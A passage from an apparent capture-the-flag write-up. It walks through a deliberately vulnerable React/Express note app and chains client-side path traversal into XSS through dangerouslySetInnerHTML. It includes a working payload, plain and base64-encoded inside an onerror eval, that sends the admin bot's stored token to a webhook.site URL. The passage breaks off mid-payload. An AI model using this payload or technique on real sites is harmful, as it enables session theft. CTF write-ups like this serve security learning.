+<p>That <code>urlRegex</code> exist in the docker-compose file and it’s equivalent to <code>^http(|s)://node:3000/.*</code>.<br>I didn’t find any other feature i can use to make me admin, narrows the circle on XSS and steal the bot’s cookie</p>
+<p>I kept reviewing the code, try to find a way to achieve XSS until i stumbled on this <code>UserProfile.tsx</code>:</p>
+<div class="code-wrapper"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useEffect, useState, useRef &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;
+<span class="hljs-keyword">import</span> &#123; userApiService, <span class="hljs-title class_">UserProfileResponse</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../services/userApi&#x27;</span>;
+
+<span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserProfileProps</span> &#123;
+  <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>;
+  <span class="hljs-attr">isCurrentUser</span>: <span class="hljs-built_in">boolean</span>;
+&#125;
+
+<span class="hljs-keyword">const</span> <span class="hljs-title class_">UserProfile</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;<span class="hljs-title class_">UserProfileProps</span>&gt; = <span class="hljs-function">(<span class="hljs-params">&#123; username, isCurrentUser &#125;</span>) =&gt;</span> &#123;
+  <span class="hljs-keyword">const</span> [userData, setUserData] = useState&lt;<span class="hljs-title class_">UserProfileResponse</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);
+  <span class="hljs-keyword">const</span> [editMode, setEditMode] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);
+  <span class="hljs-keyword">const</span> [email, setEmail] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);
+  <span class="hljs-keyword">const</span> [password, setPassword] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);
+  <span class="hljs-keyword">const</span> [profilePhoto, setProfilePhoto] = useState&lt;<span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);
+  <span class="hljs-keyword">const</span> [previewPhoto, setPreviewPhoto] = useState&lt;<span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);
+  <span class="hljs-keyword">const</span> [error, setError] = useState&lt;<span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);
+  <span class="hljs-keyword">const</span> [success, setSuccess] = useState&lt;<span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);
+  <span class="hljs-keyword">const</span> fileInputRef = useRef&lt;<span class="hljs-title class_">HTMLInputElement</span>&gt;(<span class="hljs-literal">null</span>);
+
+<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;
+    userApiService.<span class="hljs-title function_">getUserData</span>(username)
+      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;
+        <span class="hljs-title function_">setUserData</span>(data);
+        <span class="hljs-title function_">setEmail</span>(data.<span class="hljs-property">email</span>);
+        <span class="hljs-title function_">setPreviewPhoto</span>(data.<span class="hljs-property">profilePhotoUrl</span> || <span class="hljs-literal">null</span>);
+      &#125;)
+      .<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">setError</span>(<span class="hljs-string">&#x27;Failed to load user data.&#x27;</span>));
+  &#125;, [username]);
+...
+
+  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSave</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"><span class="hljs-attr">e</span>: <span class="hljs-title class_">React</span>.<span class="hljs-title class_">FormEvent</span></span>) =&gt; &#123;
+    e.<span class="hljs-title function_">preventDefault</span>();
+    <span class="hljs-title function_">setError</span>(<span class="hljs-literal">null</span>);
+    <span class="hljs-title function_">setSuccess</span>(<span class="hljs-literal">null</span>);
+    <span class="hljs-keyword">try</span> &#123;
+      <span class="hljs-keyword">let</span> <span class="hljs-attr">base64Photo</span>: <span class="hljs-built_in">string</span> | <span class="hljs-literal">undefined</span>;
+      <span class="hljs-keyword">if</span> (profilePhoto &amp;&amp; profilePhoto.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;data:&#x27;</span>)) &#123;
+        base64Photo = profilePhoto.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>)[<span class="hljs-number">1</span>];
+      &#125;
+      <span class="hljs-keyword">const</span> updated = <span class="hljs-keyword">await</span> userApiService.<span class="hljs-title function_">updateUserData</span>(username, &#123;
+        email,
+        <span class="hljs-attr">password</span>: password || <span class="hljs-literal">undefined</span>,
+        <span class="hljs-attr">profilePhoto</span>: base64Photo,
+      &#125;);
+      <span class="hljs-title function_">setUserData</span>(updated);
+      <span class="hljs-title function_">setEditMode</span>(<span class="hljs-literal">false</span>);
+      <span class="hljs-title function_">setPassword</span>(<span class="hljs-string">&#x27;&#x27;</span>);
+      <span class="hljs-title function_">setSuccess</span>(<span class="hljs-string">&#x27;Profile updated successfully!&#x27;</span>);
+      <span class="hljs-title function_">setPreviewPhoto</span>(updated.<span class="hljs-property">profilePhotoUrl</span> || <span class="hljs-literal">null</span>);
+    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-attr">err</span>: <span class="hljs-built_in">any</span>) &#123;
+      <span class="hljs-title function_">setError</span>(err.<span class="hljs-property">message</span> || <span class="hljs-string">&#x27;Failed to update profile.&#x27;</span>);
+    &#125;
+  &#125;;
+
+...
+&lt;div className=<span class="hljs-string">&quot;user-profile-container&quot;</span>&gt;
+      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>User Profile<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span>
+      &#123;error &amp;&amp; <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;profile-error&quot;</span>&gt;</span>&#123;error&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>&#125;
+      &#123;success &amp;&amp; <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;profile-success&quot;</span>&gt;</span>&#123;success&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>&#125;
+      &lt;div className=<span class="hljs-string">&quot;profile-photo-section&quot;</span>&gt;
+        &#123;<span class="hljs-comment">/* XSS-vulnerable: profilePhotoUrl is injected as raw HTML */</span>&#125;
+        &lt;div
+          dangerouslySetInnerHTML=&#123;&#123;
+            <span class="hljs-attr">__html</span>: <span class="hljs-string">`&lt;img src=&#x27;<span class="hljs-subst">$&#123;previewPhoto || <span class="hljs-string">&#x27;/default-profile.png&#x27;</span>&#125;</span>&#x27; class=&quot;profile-photo&quot; alt=&quot;Profile&quot; /&gt;`</span>
+          &#125;&#125;&gt;
+...</code></pre></div>
+
+<p>We have a <strong>UserProfile</strong> prop that has bunch of things. The code uses <a target="_blank" rel="noopener" href="https://react.dev/reference/react/useEffect">useEffect</a> which is a built in function in react where you can synchronize a component&#x2F;request with an external system.</p>
+<p>Then it make an api call to get the user data using <code>getUserData()</code> function (we will get into that in a mnt). The same is happening with the <code>hundleSave</code> function but with updated data used by the update profile function we saw earlier, making api call with <code>updateUserData()</code> function instead.</p>
+<p>Data comes from api call, will be used to set the <strong>username</strong>,<strong>email</strong>,<strong>PreviewPhoto</strong>,…etc for a specific user</p>
+<p>Then we have a <code>dangerouslySetInnerHTML</code> prop is being used by react which allows you to inject raw HTML strings directly into a DOM element, bypassing React’s usual automatic escaping of content to prevent XSS attacks. The code insert the <code>previewPhoto</code> variable in the src attribute without escaping. </p>
+<p>This <code>previewPhoto</code> variable is assigned to <code>updated.profilePhotoUrl</code> or <code>data.profilePhotoUrl</code>. That <code>profilePhotoUrl</code> parameter we saw in the very beginning when we made the update image request, in default you start without an image so <code>previewPhoto</code> is assigned to <strong>NULL</strong>.</p>
+<p>We also have a little nice hint by the author saying: <code>profilePhotoUrl is injected as raw HTML</code>.</p>
+<p>That makes me thinking, we can upload an image and inject a malicious <code>profilePhotoUrl</code> referring to our server, send it to the bot and make it get the cookie for us??</p>
+<p>I think i made things messy a little bit (sorry for that ^_^), let’s see first what are those <code>getUserData()/updateUserData()</code> functions doing in the api call.</p>
+<p><code>userApi.ts</code>:</p>
+<div class="code-wrapper"><pre><code class="hljs ts"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">API_BASE_URL</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">REACT_APP_API_URL</span> || <span class="hljs-string">&#x27;/api&#x27;</span>;
+...
+  <span class="hljs-keyword">async</span> <span class="hljs-title function_">getUserData</span>(<span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">UserProfileResponse</span>&gt; &#123;
+    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;API_BASE_URL&#125;</span>/userData/<span class="hljs-subst">$&#123;username&#125;</span>`</span>);
+    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;
+      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Failed to fetch user data&#x27;</span>);
+    &#125;
+    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();
+  &#125;
+
+  <span class="hljs-keyword">async</span> <span class="hljs-title function_">updateUserData</span>(<span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">data</span>: &#123; <span class="hljs-attr">email</span>?: <span class="hljs-built_in">string</span>; <span class="hljs-attr">password</span>?: <span class="hljs-built_in">string</span>; <span class="hljs-attr">profilePhoto</span>?: <span class="hljs-built_in">string</span> &#125;): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">UserProfileResponse</span>&gt; &#123;
+    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;API_BASE_URL&#125;</span>/userData/<span class="hljs-subst">$&#123;username&#125;</span>`</span>, &#123;
+      <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;PUT&#x27;</span>,
+      <span class="hljs-attr">headers</span>: &#123;
+        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,
+        ...<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAuthHeaders</span>(),
+      &#125;,
+      <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data),
+    &#125;);
+    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;
+      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Failed to update user data&#x27;</span>);
+    &#125;
+    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();
+  &#125;
+...</code></pre></div>
+<p>This is a react frontend api or basically a client api. It takes a username then send a fetch request to the node backend server: <code>/api/userData/$&#123;username&#125;</code>.</p>
+<p><code>UserController.ts</code>:</p>
+<div class="code-wrapper"><pre><code class="hljs ts">...
+  getUserData = <span class="hljs-title function_">async</span> (<span class="hljs-attr">req</span>: <span class="hljs-title class_">Request</span>, <span class="hljs-attr">res</span>: <span class="hljs-title class_">Response</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; =&gt; &#123;
+    <span class="hljs-keyword">try</span> &#123;
+      <span class="hljs-keyword">const</span> &#123; username &#125; = req.<span class="hljs-property">params</span>;
+      <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">databaseService</span>.<span class="hljs-title function_">getUserByUsername</span>(username);
+      <span class="hljs-keyword">if</span> (!user) &#123;
+        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;User not found&#x27;</span> &#125;);
+        <span class="hljs-keyword">return</span>;
+      &#125;
+      <span class="hljs-keyword">const</span> &#123; passwordHash, ...userData &#125; = user;
+      <span class="hljs-keyword">let</span> profilePhotoUrl = <span class="hljs-literal">null</span>;
+      <span class="hljs-keyword">const</span> photoPath = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;../../uploads&#x27;</span>, <span class="hljs-string">`<span class="hljs-subst">$&#123;user.id&#125;</span>.jpg`</span>);
+      <span class="hljs-keyword">if</span> (fs.<span class="hljs-title function_">existsSync</span>(photoPath)) &#123;
+        profilePhotoUrl = <span class="hljs-string">`/uploads/<span class="hljs-subst">$&#123;user.id&#125;</span>.jpg`</span>;
+      &#125;
+      res.<span class="hljs-title function_">json</span>(&#123; ...userData, profilePhotoUrl &#125;);
+    &#125; <span class="hljs-keyword">catch</span> (error) &#123;
+      res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Failed to fetch user data&#x27;</span> &#125;);
+    &#125;
+  &#125;;
+
+  updateUserData = <span class="hljs-title function_">async</span> (<span class="hljs-attr">req</span>: <span class="hljs-title class_">AuthenticatedRequest</span>, <span class="hljs-attr">res</span>: <span class="hljs-title class_">Response</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; =&gt; &#123;
+    <span class="hljs-keyword">try</span> &#123;
+      <span class="hljs-keyword">const</span> &#123; username &#125; = req.<span class="hljs-property">params</span>;
+      <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">user</span> || req.<span class="hljs-property">user</span>.<span class="hljs-property">username</span> !== username) &#123;
+        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Unauthorized&#x27;</span> &#125;);
+        <span class="hljs-keyword">return</span>;
+      &#125;
+      <span class="hljs-keyword">const</span> &#123; email, password &#125; = req.<span class="hljs-property">body</span>;
+      <span class="hljs-keyword">let</span> profilePhotoUrl = <span class="hljs-literal">null</span>;
+      <span class="hljs-keyword">if</span> (req.<span class="hljs-property">body</span>.<span class="hljs-property">profilePhoto</span>) &#123;
+        <span class="hljs-keyword">const</span> photoBuffer = <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">profilePhoto</span>, <span class="hljs-string">&#x27;base64&#x27;</span>);
+        <span class="hljs-keyword">const</span> photoPath = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;../../uploads&#x27;</span>, <span class="hljs-string">`<span class="hljs-subst">$&#123;req.user.id&#125;</span>.jpg`</span>);
+        fs.<span class="hljs-title function_">writeFileSync</span>(photoPath, photoBuffer);
+        profilePhotoUrl = <span class="hljs-string">`/uploads/<span class="hljs-subst">$&#123;req.user.id&#125;</span>.jpg`</span>;
+      &#125;
+      <span class="hljs-keyword">const</span> updatedUser = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">databaseService</span>.<span class="hljs-title function_">updateUserProfile</span>(req.<span class="hljs-property">user</span>.<span class="hljs-property">id</span>, &#123; email, password &#125;);
+      <span class="hljs-keyword">if</span> (!updatedUser) &#123;
+        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;User not found&#x27;</span> &#125;);
+        <span class="hljs-keyword">return</span>;
+      &#125;
+      <span class="hljs-keyword">const</span> &#123; passwordHash, ...userData &#125; = updatedUser;
+      res.<span class="hljs-title function_">json</span>(&#123; ...userData, profilePhotoUrl &#125;);
+    &#125; <span class="hljs-keyword">catch</span> (error) &#123;
+      res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Failed to update user data&#x27;</span> &#125;);
+    &#125;
+  &#125;;</code></pre></div>
+<p>This is the backend controller where requests are received from api client, Functions are defined in <code>UserController.ts</code>.</p>
+<p>This <code>getUserData</code> function basically takes a username you give, then search for it in the database to see if it’s found or not and if you have a <strong>profilePhotoUrl</strong> the function prints it in the results too.</p>
+<p>The <code>updateUserData</code> function dose almost the same thing, but it used to handle the updated data from updater profile requests.</p>
+<p>That’s dangerous, cause if we have access on that <code>username</code> we can deliver a <strong>Client-Side Path Traversal</strong> here, making the api updating malicious data with a malicious <code>profilePhotoUrl</code> that will get injected later in src attribute making XSS possible.</p>
+<p>The last thing needs to be mentioned is how the admin bot gonna react on this? I mentioned a little code above from the <strong>View Profile</strong> feature.</p>
+<div class="code-wrapper"><pre><code class="hljs tsx">...
+&lt;h2&gt;<span class="hljs-title class_">All</span> <span class="hljs-title class_">Users</span>&lt;/h2&gt;
+      &#123;usersError &amp;&amp; <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;admin-error&quot;</span>&gt;</span>&#123;usersError&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>&#125;
+      &lt;div className=<span class="hljs-string">&quot;admin-users-list&quot;</span>&gt;
+        &#123;users.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> (
+          <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;user.id&#125;</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;admin-user-item&quot;</span>&gt;</span></span>
+<span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>&#123;user.username&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span> (&#123;user.email&#125;)<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span></span>
+<span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#123;</span>`/<span class="hljs-attr">user</span>/$&#123;<span class="hljs-attr">btoa</span>(<span class="hljs-attr">user.username</span>)&#125;`&#125; <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;noopener noreferrer&quot;</span>&gt;</span>View Profile<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span>
+<span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
+        ))&#125;
+      &lt;/div&gt;
+    &lt;/div&gt;</code></pre></div>
+
+<p>This feature only accessed by admin. When you make a request to that endpoint <code>/user/$&#123;btoa(user.username)&#125;</code> it’s handled later by <code>App.tsx</code>:</p>
+<div class="code-wrapper"><pre><code class="hljs tsx">...
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">getUserProfileRoute</span>(<span class="hljs-params"></span>): <span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span> &#123;
+  <span class="hljs-keyword">const</span> match = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/^\/user\/([^/]+)$/</span>);
+  <span class="hljs-keyword">if</span> (!match) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
+  <span class="hljs-keyword">try</span> &#123;
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_">atob</span>(match[<span class="hljs-number">1</span>]);
+  &#125; <span class="hljs-keyword">catch</span> &#123;
+    <span class="hljs-keyword">return</span> match[<span class="hljs-number">1</span>];
+  &#125;
+&#125;
+...
+<span class="hljs-keyword">const</span> routeUsername = <span class="hljs-title function_">getUserProfileRoute</span>();
+...
+ <span class="hljs-keyword">if</span> (routeUsername) &#123;
+    <span class="hljs-keyword">return</span> (
+      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;App&quot;</span>&gt;</span></span>
+<span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">header</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;app-header&quot;</span>&gt;</span></span>
+<span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;header-content&quot;</span>&gt;</span></span>
+<span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>📝 Note Taking App<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>
+<span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span>
+<span class="language-xml">              <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;add-note-button&quot;</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> window.history.back()&#125;&gt;</span>
+<span class="language-xml">                Back</span>
+<span class="language-xml">              <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
+<span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
+<span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
+<span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span></span>
+<span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">main</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;app-main&quot;</span>&gt;</span></span>
+<span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">UserProfile</span> <span class="hljs-attr">username</span>=<span class="hljs-string">&#123;routeUsername&#125;</span> <span class="hljs-attr">isCurrentUser</span>=<span class="hljs-string">&#123;user?.username</span> === <span class="hljs-string">routeUsername&#125;</span> /&gt;</span></span>
+<span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span></span>
+<span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
+    );
+  &#125;</code></pre></div>
+
+<p>Notice the code have a regex to capture any request start with <code>/user/</code>, decode the base64 after it with <code>atob()</code> and will return the result to <code>getUserProfileRoute()</code> function.</p>
+<p>This function later get assigned to <code>routeUsername</code> variable and if that variable exist, it will use the <strong>UserProfile</strong> vulnerable prop on that <code>routeUsername</code></p>
+<p>There is something needs to be clear, when you send the upload image request you will receive a <code>profilePhotoUrl</code> in the response. That url will be like this: <code>/uploads/&lt;id&gt;.jpg</code> which will be used later to send it to the bot and it will contain your malicious data. You will send something like <code>/user/../../uploads/&lt;id&gt;.jpg</code> (but base64 encoded).</p>
+<p>So this part <code>/uploads/&lt;id&gt;.jpg</code> will act as a username, the flow is like the following:</p>
+<ul>
+<li>Send a malicious url to the <code>/user/../../uploads/&lt;id&gt;.jpg</code> (base64 encoded).</li>
+<li>Request will be handled by <code>App.tsx</code>, it will decode the base64 and send the request to <strong>UserProfile</strong> vulnerable prop</li>
+<li>The <code>useEffect()</code> function in the prob will receive the request and make an api call to get the data related to that username:</li>
+</ul>
+<div class="code-wrapper"><pre><code class="hljs tsx"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;
+    userApiService.<span class="hljs-title function_">getUserData</span>(username)</code></pre></div>
+<ul>
+<li>The request will be sent to the client api and it will send a fetch request to the backend to get the user data</li>
+</ul>
+<div class="code-wrapper"><pre><code class="hljs tsx"><span class="hljs-keyword">async</span> <span class="hljs-title function_">getUserData</span>(<span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">UserProfileResponse</span>&gt; &#123;
+    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;API_BASE_URL&#125;</span>/userData/<span class="hljs-subst">$&#123;username&#125;</span>`</span>);
+    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;
+      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Failed to fetch user data&#x27;</span>);
+    &#125;
+    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();
+  &#125;</code></pre></div>
+
+<ul>
+<li>The fetch request will be like this: fetch(<code>/api/userData/../../uploads/&lt;id&gt;.jpg</code>). Fetch doesn’t normalize the path, it sends it to the backend like that.</li>
+<li>The backend will receive the request with <code>../../uploads/&lt;id&gt;.jpg</code> as a username, it connects to the database and it supposed to get tha data related to that username which will clearly results an error cause it’s not a valid username, right?</li>
+</ul>
+<div class="note note-primary">
+            <p>That’s right. But the thing is, the request never reaches the database. The request is handled by the <code>express.static middleware</code> instead.<br>That’s because the <code>/uploads</code> dir is configured as a static dir in <code>index.ts</code></p> <div class="code-wrapper"><pre><code class="hljs ts">...
+app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;/uploads&#x27;</span>, express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;../uploads&#x27;</span>)));
+...</code></pre></div> <p>So the <code>express.static middleware</code> will intercept the request before it reaches the database, normalize it, get the malicious data and send it to the <code>useEffect()</code> again.</p> 
+          </div>
+<ul>
+<li><code>useEffect()</code> will receive the malicious data and assign the <code>PreviewPhoto</code> to the malicious <code>profilePhotoUrl</code> we inject.</li>
+<li><code>PreviewPhoto</code> will be inserted later in src attribute making the XSS possible</li>
+</ul>
+<p>Let’s summarize the exploit</p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><ol>
+<li>Upload an image with malicious <code>profilePhotoUrl</code> in the <code>profilePhoto</code> parameter.</li>
+<li>Send the <code>profilePhotoUrl</code> we receive from the response to the bot, add path traversal seq and base64 encode it achieving CSPT.</li>
+<li>Wait’s the cookie in our listener</li>
+</ol>
+<p>First we need a valid json required by the server like this:</p>
+<div class="code-wrapper"><pre><code class="hljs Json"><span class="hljs-punctuation">&#123;</span>
+  <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;mgqlm0ig8w0he7c95gi&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;tests&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;tes@st.com&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;createdAt&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;2025-10-14T13:29:07.096Z&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;updatedAt&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;2025-10-14T13:50:04.523Z&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;profilePhotoUrl&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/uploads/mgqlm0ig8w0he7c95gi.jpg&quot;</span>
+<span class="hljs-punctuation">&#125;</span></code></pre></div>
+<p>These parameters used later by the code, you need to follow the exact format so you won’t get errors.</p>
+<p>Our input is being injected in src attribute, i tried some payloads but most of them didn’t work through a syntax errors with single&#x2F;double quotes. So i ended up using eval with atob and btoa.</p>
+<p>Payload:</p>
+<div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">`https://webhook.site/d4387e58-541a-43b3-b82c-9b0d1f3f9b16?cok=<span class="hljs-subst">$&#123;<span class="hljs-variable language_">localStorage</span>.getItem(<span class="hljs-string">&#x27;token&#x27;</span>)&#125;</span>`</span>); <span class="hljs-comment">//base64 it</span>
+
+<span class="hljs-comment">/*###########*/</span>
+onerror=<span class="hljs-built_in">eval</span>(<span class="hljs-title function_">atob</span>(<span class="hljs-string">&#x27;ZmV0Y2goYGh0dHBzOi8vd2ViaG9vay5zaXRlL2Q0Mzg3ZTU4LTU0MWEtNDNiMy1iODJjLTliMGQxZjNmOWIxNi8/Y29rPSR7bG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3Rva2VuJyl9YCk7&#x27;</span>))</code></pre></div>
+<p>Full payload:</p>
+<div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>
+  <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;mgqlm0ig8w0he7c95gi&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;tests&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;tes@st.com&quot;</span><span class="hljs-punctuation">,</span>
